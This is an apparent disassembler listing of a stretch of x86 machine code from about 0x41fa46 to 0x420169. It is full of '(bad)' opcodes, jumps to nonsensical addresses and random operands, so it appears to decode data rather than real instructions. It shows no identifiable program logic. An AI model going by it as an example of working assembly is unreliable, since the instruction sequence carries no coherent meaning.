  41fa46:	scas   al,BYTE PTR es:[edi]
  41fa47:	call   0x1a6:0xfbeb1b39
  41fa4e:	adc    DWORD PTR [ebx],ebp
  41fa50:	dec    edx
  41fa51:	jmp    0xe922ff6
  41fa56:	sahf   
  41fa57:	outs   dx,DWORD PTR ds:[esi]
  41fa58:	hlt    
  41fa59:	dec    ecx
  41fa5a:	and    DWORD PTR [esi+0x6a],0xffffff9a
  41fa5e:	adc    BYTE PTR [esi+edx*8+0x3202e9f3],ch
  41fa65:	stos   DWORD PTR es:[edi],eax
  41fa66:	aas    
  41fa67:	and    BYTE PTR [edx],ch
  41fa69:	pop    esi
  41fa6a:	add    al,0x7a
  41fa6c:	mov    ebp,0xb93a7bf
  41fa71:	pop    eax
  41fa72:	mov    edx,0xfa05e406
  41fa77:	adc    ebp,ebp
  41fa79:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41fa7b:	dec    ebx
  41fa7c:	cmc    
  41fa7d:	sar    DWORD PTR [edx],1
  41fa7f:	hlt    
  41fa80:	ret    0xa7fd
  41fa83:	jnp    0x41fae9
  41fa85:	sar    DWORD PTR [edx-0x47],1
  41fa88:	pop    ds
  41fa89:	jo     0x22d2e83
  41fa8f:	xchg   edi,eax
  41fa90:	xchg   ecx,eax
  41fa91:	mov    BYTE PTR ds:0x968ca14d,ah
  41fa97:	lods   al,BYTE PTR ds:[esi]
  41fa98:	adc    al,0xc1
  41fa9a:	add    BYTE PTR [ebx+0x4b],cl
  41fa9d:	mov    ebp,0xd732322c
  41faa2:	retf   0x290
  41faa5:	push   ss
  41faa6:	popa   
  41faa7:	cwde   
  41faa8:	cmp    eax,0x66de694f
  41faad:	jl     0x41fa71
  41faaf:	sbb    DWORD PTR [edx],edx
  41fab1:	stos   DWORD PTR es:[edi],eax
  41fab2:	cvtps2pd xmm2,QWORD PTR [esi+0x786c7b94]
  41fab9:	lahf   
  41faba:	(bad)  
  41fabb:	jmp    FWORD PTR [edi-0x4e2433d6]
  41fac1:	push   0xc8fbcf4
  41fac6:	lahf   
  41fac7:	jns    0x41fa86
  41fac9:	lods   al,BYTE PTR ds:[esi]
  41faca:	pop    ecx
  41facb:	mov    dl,0xb1
  41facd:	stos   DWORD PTR es:[edi],eax
  41face:	pop    WORD PTR [edi-0x33]
  41fad2:	(bad)  
  41fad3:	sub    al,0xd0
  41fad5:	in     al,0x53
  41fad7:	stos   BYTE PTR es:[edi],al
  41fad8:	call   0x81e8:0xcfe6265b
  41fadf:	ret    0x50d
  41fae2:	(bad)  
  41fae3:	arpl   dx,bp
  41fae5:	rol    DWORD PTR [ebp-0x7401db2e],1
  41faeb:	inc    ecx
  41faec:	jb     0x41fb44
  41faee:	gs sub al,0x87
  41faf1:	fadd   QWORD PTR [ebp-0x604487b5]
  41faf7:	cli    
  41faf8:	outs   dx,DWORD PTR ds:[esi]
  41faf9:	lock aad 0x8a
  41fafc:	test   al,0xf9
  41fafe:	or     al,0x81
  41fb00:	push   ebp
  41fb01:	popa   
  41fb02:	in     eax,dx
  41fb03:	fild   QWORD PTR [edx+0x95187ee]
  41fb09:	leave  
  41fb0a:	aaa    
  41fb0b:	out    dx,al
  41fb0c:	fwait
  41fb0d:	add    eax,edx
  41fb0f:	frstor [ebx*1+0x37d13274]
  41fb16:	bound  edi,QWORD PTR [esi+esi*8+0x42]
  41fb1a:	sbb    edi,DWORD PTR [eax+0x29]
  41fb1d:	les    ebx,FWORD PTR [esi+ebx*2]
  41fb20:	inc    esi
  41fb21:	fmul   QWORD PTR [ecx]
  41fb23:	imul   esp,ebp,0x901fefe7
  41fb29:	daa    
  41fb2a:	xor    BYTE PTR [ebp+0x36],dh
  41fb2d:	and    al,dh
  41fb2f:	inc    esi
  41fb30:	push   ecx
  41fb31:	sub    ah,BYTE PTR [esi+0x18]
  41fb34:	fild   WORD PTR [ecx+0x3c92490f]
  41fb3a:	dec    eax
  41fb3b:	mov    esp,0x2d6160ba
  41fb40:	inc    edx
  41fb41:	xor    eax,DWORD PTR [eax+ebx*8-0x65a227b6]
  41fb48:	inc    ebp
  41fb49:	jecxz  0x41fb76
  41fb4b:	pop    ds
  41fb4c:	dec    esp
  41fb4d:	out    0xce,eax
  41fb4f:	xor    BYTE PTR [esp+ebx*1+0x52c74d0b],0xff
  41fb57:	mov    BYTE PTR [esi+0x1b],cl
  41fb5a:	out    0x71,al
  41fb5c:	cmp    esi,DWORD PTR [ebp+eiz*2+0x71]
  41fb60:	and    cl,BYTE PTR [edx+ecx*2+0x662ec376]
  41fb67:	or     cl,BYTE PTR [esi]
  41fb69:	xlat   BYTE PTR ds:[ebx]
  41fb6a:	push   cs
  41fb6b:	repz pusha 
  41fb6d:	push   es
  41fb6e:	jmp    0xa730d8f3
  41fb73:	adc    eax,0x61de87ab
  41fb78:	mov    DWORD PTR [eax+0x62a61032],edx
  41fb7e:	dec    esp
  41fb7f:	cmp    eax,0x885b9278
  41fb84:	mov    eax,ds:0x869a97a4
  41fb89:	jnp    0x41fb6c
  41fb8b:	imul   ecx,edi,0xcf9a59f
  41fb91:	cmp    esp,DWORD PTR [ecx+esi*1+0x68544856]
  41fb98:	mov    dl,0xd4
  41fb9a:	xchg   esp,eax
  41fb9b:	push   0xffffffd4
  41fb9d:	pop    eax
  41fb9e:	cmp    ah,BYTE PTR [esi-0x4b]
  41fba1:	aad    0x89
  41fba3:	adc    eax,0x18d909fe
  41fba8:	and    BYTE PTR [esi],dh
  41fbaa:	mov    eax,DWORD PTR [ebp+0x4c]
  41fbad:	test   BYTE PTR [edi-0x45],dh
  41fbb0:	mov    esp,0x7460b844
  41fbb5:	xchg   edx,eax
  41fbb6:	loop   0x41fc20
  41fbb8:	icebp  
  41fbb9:	adc    esp,DWORD PTR [edi]
  41fbbb:	and    BYTE PTR [eax],dl
  41fbbd:	mov    cl,0xe3
  41fbbf:	js     0x41fc33
  41fbc1:	(bad)  
  41fbc2:	mov    ah,0x99
  41fbc4:	jge    0x41fc3b
  41fbc6:	fs je  0x41fbe8
  41fbc9:	mov    eax,ds:0xcda08fbd
  41fbce:	inc    edx
  41fbcf:	push   edx
  41fbd0:	fwait
  41fbd1:	(bad)  
  41fbd2:	pop    esp
  41fbd3:	daa    
  41fbd4:	inc    edi
  41fbd5:	adc    eax,0x447606b2
  41fbda:	jno    0x41fb8f
  41fbdc:	mov    cl,0x9d
  41fbde:	sbb    ebx,0x9f3240a9
  41fbe4:	add    BYTE PTR [eax-0xa2f8a47],ch
  41fbea:	test   BYTE PTR [ecx+0x71ecbaf0],ah
  41fbf0:	ret    0xc7b9
  41fbf3:	mov    DWORD PTR [ecx],edi
  41fbf5:	shl    edi,cl
  41fbf7:	adc    ecx,DWORD PTR [ebp+0x6]
  41fbfa:	mov    esp,0xa88f327f
  41fbff:	test   al,0x30
  41fc01:	popf   
  41fc02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc03:	mov    cs,WORD PTR [esi-0x54]
  41fc06:	mov    cl,0x59
  41fc08:	nop
  41fc09:	out    dx,al
  41fc0a:	mov    ecx,0xe3131388
  41fc0f:	push   esp
  41fc10:	xchg   edx,eax
  41fc11:	pop    ebp
  41fc12:	jbe    0x41fbb1
  41fc14:	ror    ebp,cl
  41fc16:	pop    ecx
  41fc17:	stos   BYTE PTR es:[edi],al
  41fc18:	mov    ch,0xba
  41fc1a:	das    
  41fc1b:	sbb    eax,DWORD PTR [ecx+0x4d]
  41fc1e:	cdq    
  41fc1f:	jae    0x41fc96
  41fc21:	stos   BYTE PTR es:[edi],al
  41fc22:	jb     0x41fbbf
  41fc24:	inc    esi
  41fc25:	pop    edi
  41fc26:	sub    dl,BYTE PTR [edi+edx*2+0x2b]
  41fc2a:	mov    bh,0x14
  41fc2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc2d:	aam    0xa2
  41fc2f:	pop    ebx
  41fc30:	sbb    eax,0xabb9d294
  41fc35:	sub    dh,ah
  41fc37:	jb     0x41fc29
  41fc39:	jg     0x41fca0
  41fc3b:	xchg   ebx,eax
  41fc3c:	sbb    eax,0x12d8c1a4
  41fc41:	inc    esi
  41fc42:	in     eax,dx
  41fc43:	xchg   DWORD PTR [edx],edi
  41fc45:	add    BYTE PTR [edi],bh
  41fc47:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc49:	inc    edi
  41fc4a:	pop    ss
  41fc4b:	cdq    
  41fc4c:	sbb    al,0x98
  41fc4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc4f:	dec    esi
  41fc50:	test   al,0x5f
  41fc52:	inc    ebx
  41fc53:	test   al,0xd6
  41fc55:	cwde   
  41fc56:	cmc    
  41fc57:	mov    bl,0x65
  41fc59:	xchg   esp,eax
  41fc5a:	mov    eax,0x3b4c2c65
  41fc5f:	out    0x4f,al
  41fc61:	leave  
  41fc62:	xchg   ecx,eax
  41fc63:	test   ebx,ecx
  41fc65:	jmp    0x41fc30
  41fc67:	ds loopne 0x41fce5
  41fc6a:	ficomp DWORD PTR [ecx+ebx*1]
  41fc6d:	in     al,0x47
  41fc6f:	enter  0xf873,0x68
  41fc73:	fwait
  41fc74:	sbb    dh,BYTE PTR [edi*8+0x57a9a730]
  41fc7b:	or     ah,ah
  41fc7d:	pop    esp
  41fc7e:	xchg   BYTE PTR [esi-0x19b92ac6],al
  41fc84:	and    esp,DWORD PTR [esi+0x79a082d5]
  41fc8a:	wbinvd 
  41fc8c:	inc    edx
  41fc8d:	cmc    
  41fc8e:	push   ecx
  41fc8f:	std    
  41fc90:	push   esi
  41fc91:	jl     0x41fc77
  41fc93:	sub    bl,dl
  41fc95:	je     0x41fc29
  41fc97:	dec    esi
  41fc98:	aad    0x53
  41fc9a:	enter  0x8896,0x66
  41fc9e:	push   edx
  41fc9f:	push   ecx
  41fca0:	out    dx,al
  41fca1:	pusha  
  41fca2:	add    bl,BYTE PTR [edx+0x36]
  41fca5:	mov    ebp,0xe9e2aca3
  41fcaa:	sub    eax,0x6078420e
  41fcaf:	sbb    DWORD PTR [edi+0x58862d90],esi
  41fcb5:	push   ecx
  41fcb6:	inc    edi
  41fcb7:	add    esp,DWORD PTR [esi]
  41fcb9:	daa    
  41fcba:	pop    eax
  41fcbb:	jb     0x41fc79
  41fcbd:	icebp  
  41fcbe:	and    BYTE PTR [eax+ecx*8-0x1c],ch
  41fcc2:	adc    DWORD PTR [edi+0x7d],esp
  41fcc5:	inc    edi
  41fcc6:	adc    al,0x4
  41fcc8:	xlat   BYTE PTR ds:[ebx]
  41fcc9:	out    dx,al
  41fcca:	lea    ebx,[ecx+edx*8-0x5e]
  41fcce:	pop    es
  41fccf:	out    0xdf,eax
  41fcd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcd2:	push   ebp
  41fcd3:	mov    esi,0x237c8c4
  41fcd8:	xchg   BYTE PTR [esi-0xf29d2b7],cl
  41fcde:	stc    
  41fcdf:	mov    esp,0xa3c01b4d
  41fce4:	jle    0x41fd29
  41fce6:	inc    edi
  41fce7:	out    dx,eax
  41fce8:	dec    eax
  41fce9:	arpl   cx,dx
  41fceb:	pop    ecx
  41fced:	(bad)  [ecx+0x3af79423]
  41fcf3:	shl    BYTE PTR [ecx],cl
  41fcf5:	in     al,dx
  41fcf6:	and    esi,DWORD PTR [edx+edx*2]
  41fcf9:	clc    
  41fcfa:	dec    ebx
  41fcfb:	mov    al,ds:0x1ffea64
  41fd00:	outs   dx,DWORD PTR ds:[esi]
  41fd01:	int    0xf0
  41fd03:	push   ebx
  41fd04:	fcomp  DWORD PTR [edi+0x64]
  41fd07:	jbe    0x41fd53
  41fd09:	xchg   ebp,eax
  41fd0a:	mov    WORD PTR [edx],ds
  41fd0c:	inc    ebx
  41fd0d:	xor    BYTE PTR [ecx],0xb5
  41fd10:	dec    ecx
  41fd11:	out    dx,al
  41fd12:	inc    ebp
  41fd13:	pop    edx
  41fd14:	mov    ch,0x1a
  41fd16:	in     eax,dx
  41fd17:	(bad)  
  41fd18:	mov    edx,0xb994d821
  41fd1d:	sahf   
  41fd1e:	in     eax,0x12
  41fd20:	dec    edi
  41fd21:	sub    al,0xb4
  41fd23:	dec    esp
  41fd24:	jl     0x41fd41
  41fd26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd27:	jecxz  0x41fd61
  41fd29:	cmp    ch,BYTE PTR [ecx+0x7223393d]
  41fd2f:	ret    
  41fd30:	stc    
  41fd31:	jb     0x41fd7f
  41fd33:	mov    ch,0xb8
  41fd35:	inc    esp
  41fd36:	jle    0x41fd7d
  41fd38:	cmovle ebp,DWORD PTR [esi]
  41fd3b:	rol    ecx,0x2
  41fd3e:	xchg   esp,eax
  41fd3f:	jnp    0x41fd49
  41fd41:	push   edi
  41fd42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd43:	push   edi
  41fd44:	(bad)  
  41fd45:	(bad)  [ebp-0x14]
  41fd48:	fbstp  TBYTE PTR [ebp+eiz*2-0x57]
  41fd4c:	test   esp,0xf8477c4a
  41fd52:	jge    0x41fd1e
  41fd54:	bound  ebp,QWORD PTR [eax-0x1e]
  41fd57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd58:	nop
  41fd59:	push   ss
  41fd5a:	xchg   edi,eax
  41fd5b:	cli    
  41fd5c:	add    eax,0xf5ce8f8a
  41fd61:	and    al,0xf4
  41fd63:	mov    WORD PTR [edi+edi*8+0x4a5f1e0b],ss
  41fd6a:	xchg   ebx,eax
  41fd6b:	xchg   ecx,edx
  41fd6d:	jge    0x41fd9b
  41fd6f:	je     0x41fd6b
  41fd71:	sahf   
  41fd72:	fist   DWORD PTR [edi-0xd388ae2]
  41fd78:	pop    ecx
  41fd79:	stos   BYTE PTR es:[edi],al
  41fd7a:	xor    eax,0xf17f6b8d
  41fd7f:	xor    al,0x23
  41fd81:	adc    cl,bh
  41fd83:	mov    eax,ds:0xac0bca5d
  41fd88:	mov    al,ds:0x965116f9
  41fd8d:	pop    ds
  41fd8e:	into   
  41fd8f:	dec    edx
  41fd90:	imul   edx,DWORD PTR [ebp+0x73a5142a],0x26940c99
  41fd9a:	or     edi,DWORD PTR [ebp+eiz*8-0x60ddb468]
  41fda1:	popf   
  41fda2:	jmp    0x41fd79
  41fda4:	jae    0x41fd65
  41fda6:	sub    al,0x93
  41fda8:	lods   eax,DWORD PTR ds:[esi]
  41fda9:	nop
  41fdaa:	js     0x41fdab
  41fdac:	jno    0x41fd8d
  41fdae:	push   0x3e
  41fdb0:	(bad)  
  41fdb2:	jns    0x41fdb4
  41fdb4:	test   bh,al
  41fdb6:	jle    0x41fd78
  41fdb8:	fwait
  41fdb9:	adc    dh,0xcd
  41fdbc:	and    esi,edi
  41fdbe:	lods   al,BYTE PTR ds:[esi]
  41fdbf:	sar    DWORD PTR [ecx+ebx*8],0x5b
  41fdc3:	xchg   esp,eax
  41fdc4:	ins    BYTE PTR es:[edi],dx
  41fdc5:	or     bh,BYTE PTR [esi]
  41fdc7:	stc    
  41fdc8:	add    ebp,esp
  41fdca:	(bad)  
  41fdcb:	adc    ebx,esp
  41fdcd:	or     al,0x82
  41fdcf:	mov    cl,dh
  41fdd1:	daa    
  41fdd2:	out    dx,eax
  41fdd3:	cmc    
  41fdd4:	pop    es
  41fdd5:	fsubp  st(1),st
  41fdd7:	sub    al,0xdc
  41fdd9:	into   
  41fdda:	or     eax,0xb6e3a3e6
  41fddf:	pop    es
  41fde0:	bound  ebp,QWORD PTR [esi-0x6f]
  41fde3:	push   cs
  41fde4:	add    BYTE PTR [eax-0x4b],cl
  41fde7:	bound  esp,QWORD PTR [eax]
  41fde9:	pop    ecx
  41fdea:	pop    edx
  41fdeb:	popa   
  41fdec:	cdq    
  41fded:	adc    cl,BYTE PTR [ebx+0x7e]
  41fdf0:	repnz cmp edi,esi
  41fdf3:	and    ebp,DWORD PTR [eax-0x6f]
  41fdf6:	jae    0x41fd84
  41fdf8:	(bad)  
  41fdf9:	sbb    esi,DWORD PTR [edx+0x24]
  41fdfc:	and    BYTE PTR [eax],bl
  41fdfe:	lods   al,BYTE PTR ds:[esi]
  41fdff:	adc    eax,0xa04f7ca2
  41fe04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe05:	jo     0x41fdde
  41fe07:	sub    DWORD PTR [esp+ecx*2],ecx
  41fe0a:	xchg   edi,eax
  41fe0b:	lods   eax,DWORD PTR ds:[esi]
  41fe0c:	cmp    DWORD PTR [ebp-0x16],eax
  41fe0f:	jne    0x41fe4b
  41fe11:	fcmovnu st,st(3)
  41fe13:	mov    edx,0xf4570ff0
  41fe18:	pop    esi
  41fe19:	mov    bl,BYTE PTR [edi+eax*1]
  41fe1c:	(bad)  
  41fe1d:	lock shl bl,cl
  41fe20:	mov    dh,0x7b
  41fe22:	call   0x622e4498
  41fe27:	sbb    esi,DWORD PTR [edx+0x89f182b]
  41fe2d:	inc    esi
  41fe2e:	jne    0x41fe59
  41fe30:	out    dx,eax
  41fe31:	stc    
  41fe32:	imul   ebp,DWORD PTR [edx+0x67],0x14
  41fe36:	test   ebx,ebx
  41fe38:	cmc    
  41fe39:	mov    esp,0x158b8f35
  41fe3e:	cdq    
  41fe3f:	xchg   ecx,eax
  41fe40:	sbb    BYTE PTR [edx-0x5e],bl
  41fe43:	cs inc ebp
  41fe45:	mov    bl,0x91
  41fe47:	push   0xffffffc2
  41fe49:	dec    ch
  41fe4b:	add    eax,0x2f12a891
  41fe50:	imul   ebx,DWORD PTR [ebp-0x18],0xffffffeb
  41fe54:	mov    ch,0x14
  41fe56:	ins    DWORD PTR es:[edi],dx
  41fe57:	dec    ebp
  41fe58:	adc    BYTE PTR [ebp+0x3e],ch
  41fe5b:	sbb    eax,0x3284c916
  41fe60:	in     al,0xba
  41fe62:	aad    0x7e
  41fe64:	sbb    al,0x76
  41fe67:	in     al,dx
  41fe68:	mov    bl,0x70
  41fe6a:	mov    eax,0xed5b589d
  41fe6f:	cmp    ah,BYTE PTR [esi+ebp*2]
  41fe72:	xor    ch,BYTE PTR [edx]
  41fe74:	jle    0x41fee5
  41fe76:	aaa    
  41fe77:	out    dx,al
  41fe78:	ss je  0x41fea6
  41fe7b:	(bad)
  41fe80:	sahf   
  41fe81:	mov    dh,0xdf
  41fe83:	out    0x17,eax
  41fe85:	dec    ebx
  41fe86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe87:	inc    ecx
  41fe88:	xchg   edx,eax
  41fe89:	xchg   edx,eax
  41fe8a:	pop    esp
  41fe8b:	outs   dx,DWORD PTR ds:[esi]
  41fe8c:	mov    ebx,0x80892b75
  41fe91:	test   bl,0x2a
  41fe94:	mov    ebp,0xfc2cd0cb
  41fe99:	aas    
  41fe9a:	aas    
  41fe9b:	stos   BYTE PTR es:[edi],al
  41fe9c:	scas   eax,DWORD PTR es:[edi]
  41fe9d:	out    dx,al
  41fe9e:	cmp    al,0x81
  41fea0:	daa    
  41fea1:	mov    ah,0x32
  41fea3:	xor    al,0xcd
  41fea5:	xchg   DWORD PTR [edx],ebp
  41fea7:	push   ebx
  41fea8:	dec    eax
  41fea9:	or     DWORD PTR [ebp+0x55],0xffffffa9
  41fead:	or     eax,0x713b9410
  41feb2:	(bad)  
  41feb3:	cmp    BYTE PTR [ebx-0xa],bh
  41feb6:	(bad)  [ebx+0x13e72f07]
  41febc:	fisubr WORD PTR [edx]
  41febe:	ret    0x1c02
  41fec1:	dec    ecx
  41fec2:	outs   dx,DWORD PTR ds:[esi]
  41fec3:	pop    edx
  41fec4:	xor    al,0x48
  41fec6:	mov    edi,0x39043a7e
  41fecb:	ja     0x41ff27
  41fecd:	jl     0x41ff24
  41fecf:	rol    DWORD PTR ds:[ebx-0x16],1
  41fed3:	cmp    BYTE PTR [eax],bl
  41fed5:	dec    edi
  41fed6:	in     eax,dx
  41fed7:	dec    esp
  41fed8:	xor    BYTE PTR [edi-0xffb4d8f],cl
  41fede:	es push ds
  41fee0:	and    ah,ah
  41fee2:	push   0xffffff99
  41fee4:	and    cl,dh
  41fee6:	cmp    ebx,DWORD PTR [eax]
  41fee8:	mov    ch,0x79
  41feea:	mov    al,0x3a
  41feec:	push   ebx
  41feed:	xlat   BYTE PTR ds:[ebx]
  41feee:	jecxz  0x41fe97
  41fef0:	ss (bad) 
  41fef2:	mov    ebx,0x764ac46c
  41fef7:	mov    ds,WORD PTR [eiz*4+0x4d79a71b]
  41fefe:	sub    esi,0x27
  41ff01:	scas   eax,DWORD PTR es:[edi]
  41ff02:	or     al,0x31
  41ff04:	shr    cl,1
  41ff06:	hlt    
  41ff07:	mov    al,ds:0x1b053c92
  41ff0c:	inc    edi
  41ff0d:	sbb    eax,0x19f5ec4c
  41ff12:	pop    esi
  41ff13:	push   cs
  41ff14:	jae    0x41fea9
  41ff16:	xchg   edi,eax
  41ff17:	pop    esi
  41ff18:	mov    bh,bl
  41ff1a:	jg     0x41ff8f
  41ff1c:	mov    ds:0x25fd69cb,al
  41ff21:	dec    edi
  41ff22:	addr16 cdq 
  41ff24:	jns    0x41feb8
  41ff26:	and    dl,bl
  41ff28:	mov    WORD PTR [eax+ebx*2+0x690e9022],?
  41ff2f:	ror    BYTE PTR [ebp-0x35f9d522],0xc9
  41ff36:	daa    
  41ff37:	dec    edx
  41ff38:	inc    eax
  41ff39:	push   ecx
  41ff3a:	sub    dl,0xc1
  41ff3d:	stc    
  41ff3e:	imul   esp,DWORD PTR [eax-0x62b1698d],0xc3903d2f
  41ff48:	inc    edi
  41ff49:	aad    0xb4
  41ff4b:	ins    DWORD PTR es:[edi],dx
  41ff4c:	loop   0x41ff97
  41ff4e:	pop    ds
  41ff4f:	fst    QWORD PTR [eax]
  41ff51:	or     eax,0xf76ac9ae
  41ff56:	mov    al,ds:0x8c2c556f
  41ff5b:	repnz and BYTE PTR [bp+di-0x5553],bl
  41ff61:	push   edi
  41ff62:	rol    DWORD PTR [edx],cl
  41ff64:	dec    edi
  41ff65:	cmp    eax,0x2b006835
  41ff6a:	ret    
  41ff6b:	xchg   ebp,eax
  41ff6c:	and    BYTE PTR [edx-0x17047a25],ch
  41ff72:	retf   0x4ace
  41ff75:	adc    DWORD PTR [edi],0xfe83a4d1
  41ff7b:	repz loopne 0x41ffc8
  41ff7e:	mov    esp,0x87a7a933
  41ff83:	jnp    0x41ff59
  41ff85:	pop    ds
  41ff86:	bound  edx,QWORD PTR [ebx]
  41ff88:	(bad)  
  41ff89:	mov    esi,0x95646bb7
  41ff8e:	loopne 0x41fff1
  41ff90:	sbb    edx,DWORD PTR [edi-0x7799b42c]
  41ff96:	cwde   
  41ff97:	add    al,0x8a
  41ff99:	je     0x41ff3c
  41ff9b:	clc    
  41ff9c:	popa   
  41ff9d:	jge    0x41fff9
  41ff9f:	lea    edx,[ebp+eax*4+0x25]
  41ffa3:	pop    ss
  41ffa4:	pop    esp
  41ffa5:	imul   edi,DWORD PTR [ecx-0x3],0x28
  41ffa9:	xchg   ecx,eax
  41ffaa:	pop    ecx
  41ffab:	into   
  41ffac:	jb     0x41ff35
  41ffae:	jne    0x41ff9d
  41ffb0:	adc    DWORD PTR [ecx-0x5b],edi
  41ffb3:	repnz sub al,0xb1
  41ffb6:	adc    ebp,DWORD PTR [esp+esi*4-0x5161480b]
  41ffbd:	call   0xdf0a:0x95f92a6c
  41ffc4:	mov    WORD PTR [ecx+0x38bb652f],?
  41ffca:	adc    dl,BYTE PTR [ebx+0x64]
  41ffcd:	rcl    BYTE PTR [edx-0x2aa959e0],1
  41ffd3:	lods   eax,DWORD PTR ds:[esi]
  41ffd4:	fdivrp st(1),st
  41ffd6:	jo     0x41ffe4
  41ffd8:	push   esi
  41ffd9:	cmp    eax,0x4ce70bcd
  41ffde:	mov    DWORD PTR [edi+edi*2],ecx
  41ffe1:	pop    esp
  41ffe2:	fxch   st(7)
  41ffe4:	lea    edx,[ebx-0x1c8c65b2]
  41ffea:	(bad)  
  41ffeb:	jno    0x42004b
  41ffed:	test   al,0x5d
  41ffef:	mov    dl,0x9e
  41fff1:	neg    esi
  41fff3:	fwait
  41fff4:	cmp    al,0x3e
  41fff6:	jmp    0x41ffab
  41fff8:	in     al,dx
  41fff9:	and    BYTE PTR [esi],bl
  41fffb:	arpl   WORD PTR [esi-0x3a],si
  41fffe:	gs push esi
  420000:	mov    bh,0x7b
  420002:	inc    edi
  420003:	js     0x41ffa0
  420005:	mov    cl,0xda
  420007:	adc    edx,DWORD PTR [eax-0x19]
  42000a:	dec    esp
  42000b:	jo     0x41ffbf
  42000d:	aaa    
  42000e:	jl     0x41ff90
  420010:	rol    DWORD PTR [ebp-0x44],0xf2
  420014:	mov    ch,0xe9
  420016:	loope  0x420054
  420018:	pop    esp
  420019:	inc    esp
  42001a:	jg     0x41ffd2
  42001c:	add    eax,0x48b4e682
  420021:	inc    ebx
  420022:	cdq    
  420023:	adc    DWORD PTR [edx+0x3619db28],esi
  420029:	mov    dh,0x94
  42002b:	mov    ch,0x64
  42002d:	mov    al,ds:0x5e38e65b
  420032:	imul   edi,DWORD PTR [ecx],0xfffffffa
  420035:	mov    BYTE PTR ds:0x3660dc13,bh
  42003b:	imul   ecx,edx,0xfffffff6
  42003e:	inc    edi
  42003f:	lahf   
  420040:	sub    bh,BYTE PTR [edx+0x38501e3e]
  420046:	call   0xbff16ecc
  42004b:	xor    esi,DWORD PTR [ecx-0x3e]
  42004e:	jbe    0x41fff5
  420050:	outs   dx,DWORD PTR ds:[esi]
  420051:	push   eax
  420052:	jl     0x420029
  420054:	sahf   
  420055:	sbb    cl,BYTE PTR [edi-0x58]
  420058:	fidiv  DWORD PTR [ebp+0x62]
  42005b:	cli    
  42005c:	test   al,0x3a
  42005e:	jb     0x41ffe4
  420060:	fidivr WORD PTR [esi-0x79]
  420063:	dec    ecx
  420064:	fnstcw WORD PTR [edx+0x40652379]
  42006a:	inc    ecx
  42006b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42006c:	sbb    DWORD PTR [ebx],edx
  42006e:	sub    bl,bl
  420070:	jb     0x4200ef
  420072:	ja     0x420019
  420074:	mov    bl,0x95
  420076:	adc    al,0xfd
  420078:	dec    edi
  420079:	mov    BYTE PTR [ebx-0x2e5b40ec],bl
  42007f:	stos   DWORD PTR es:[edi],eax
  420080:	push   edx
  420081:	ret    0xd543
  420084:	mov    dh,bl
  420086:	inc    ecx
  420087:	loope  0x420105
  420089:	test   al,0x11
  42008b:	(bad)  
  42008d:	jp     0x42002b
  42008f:	and    BYTE PTR [ebx+edi*2+0x4b],0x9f
  420094:	stos   BYTE PTR es:[edi],al
  420095:	retf   0x2d21
  420098:	nop
  420099:	sbb    cl,dl
  42009b:	je     0x42002d
  42009d:	in     al,dx
  42009e:	add    al,0x8b
  4200a0:	popf   
  4200a1:	or     eax,0xee9406fe
  4200a6:	fnstcw WORD PTR [edx+0x40]
  4200a9:	test   DWORD PTR [eax-0x4b],edx
  4200ac:	add    eax,0x65da3c98
  4200b1:	mov    eax,0x38433515
  4200b6:	pop    ebx
  4200b7:	add    al,0x30
  4200b9:	xor    eax,0xb4ebf072
  4200be:	rol    DWORD PTR [ebp+0xc],cl
  4200c1:	aad    0xd4
  4200c3:	rcl    BYTE PTR [edi+eiz*1],cl
  4200c6:	inc    esi
  4200c7:	es dec ebp
  4200c9:	(bad)  
  4200ca:	cmp    edi,DWORD PTR [ebx-0x6f]
  4200cd:	mov    esi,0xac1036a8
  4200d2:	push   cs
  4200d3:	scas   al,BYTE PTR es:[edi]
  4200d4:	push   ebx
  4200d5:	xchg   ecx,eax
  4200d6:	in     al,dx
  4200d7:	int    0x3c
  4200d9:	sqrtps xmm3,XMMWORD PTR [eax+0x72]
  4200dd:	adc    eax,0xebafb0ef
  4200e2:	(bad)
  4200e6:	lods   eax,DWORD PTR ds:[esi]
  4200e8:	dec    ebx
  4200e9:	push   ds
  4200ea:	rol    ch,1
  4200ec:	jp     0x420103
  4200ee:	adc    al,0x6c
  4200f0:	call   0x6d4cf855
  4200f5:	inc    esi
  4200f6:	out    0x6c,al
  4200f8:	push   cx
  4200fa:	sbb    DWORD PTR [edi+eax*2+0x4a],ebx
  4200fe:	in     al,dx
  4200ff:	mov    ebx,0xb1c4e037
  420104:	pusha  
  420105:	test   eax,0xbff749b3
  42010a:	jle    0x42009e
  42010c:	add    eax,0xc6c6d611
  420111:	out    dx,al
  420112:	mov    BYTE PTR [esi],bh
  420114:	fdivrp st(2),st
  420116:	jo     0x420147
  420118:	and    BYTE PTR [edi+eiz*1+0x14],dl
  42011c:	fist   WORD PTR [eax]
  42011e:	push   edi
  42011f:	data16 add dh,BYTE PTR [ebx-0x7593180f]
  420126:	jne    0x4200d9
  420128:	jnp    0x4200f5
  42012a:	gs jnp 0x42012a
  42012d:	bound  esp,QWORD PTR [edx]
  42012f:	repz sbb al,0x85
  420132:	mov    al,0x12
  420134:	jmp    0x206e4d2a
  420139:	out    0x29,al
  42013b:	jmp    0xae690c00
  420140:	mov    al,0xa4
  420142:	loop   0x420136
  420144:	inc    eax
  420145:	jno    0x4200ca
  420147:	push   ds
  420148:	lock xor DWORD PTR [edx-0x79f6362f],edx
  42014f:	and    BYTE PTR [edi+0x30],dl
  420152:	cmp    DWORD PTR [edi-0x71e261a9],0x78
  420159:	mov    ah,0xf1
  42015b:	ins    BYTE PTR es:[edi],dx
  42015c:	int3   
  42015d:	(bad)  
  42015e:	xchg   ebx,eax
  42015f:	xor    cl,BYTE PTR [eax]
  420161:	(bad)  
  420162:	in     eax,dx
  420163:	sbb    DWORD PTR [edx+0x17250cb6],esi
  420169:	sub    al,0xd8
